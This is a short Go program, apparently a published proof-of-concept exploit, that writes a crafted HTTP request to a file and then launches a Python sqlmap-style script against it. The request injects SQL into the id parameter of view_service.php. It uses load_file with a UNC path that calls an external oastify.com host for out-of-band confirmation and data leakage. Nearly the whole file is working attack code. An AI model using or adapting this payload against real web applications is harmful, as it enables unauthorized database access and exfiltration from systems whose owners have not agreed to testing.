// @nu11secur1ty 2023-2024
package main

import (
    "fmt"
    "log"
    "os"
    "os/exec"
    "io"
    "bufio"
)

func main() {
	
    f, err := os.Create("exploit.txt")

    if err != nil {
        log.Fatal(err)
    }
	
    defer f.Close()

    val := `GET /lssems/view_service.php?id=(select%20load_file('%5c%5c%5c%5cdubtrjtp52ismo1wn5gb2bwt3k9dx9u1iskgb31rq.oastify.com%5c%5caey')) HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: PHPSESSID=g2ktghcqrdt3m7kgrv57a4p9le
X-Requested-With: XMLHttpRequest
Referer: http://localhost/lssems/index.php?page=services
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0`

    data := []byte(val)

    _, err2 := f.Write(data)

    if err2 != nil {
        log.Fatal(err2)
    }
		fmt.Println("done..The PoC was created, and the exploit will be continuing...")
     
    // Start Colors
    cBlue := "\033[34m"
    fmt.Println(cBlue)
    // End color
    cmd := exec.Command("python", "G0BurpSQLmaPI.py", "--input-file", "documents/doc.png")
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        panic(err)
    }
    stderr, err := cmd.StderrPipe()
    if err != nil {
        panic(err)
    }
    err = cmd.Start()
    if err != nil {
        panic(err)
    }

    go copyOutput(stdout)
	go copyOutput(stderr)
	
    cmd.Wait()
    // Start Colors
    cWhite := "\033[37m"
    fmt.Println(cWhite)
    // End color
}

func copyOutput(r io.Reader) {
    scanner := bufio.NewScanner(r)
    for scanner.Scan() {
        fmt.Println(scanner.Text())
    }
}
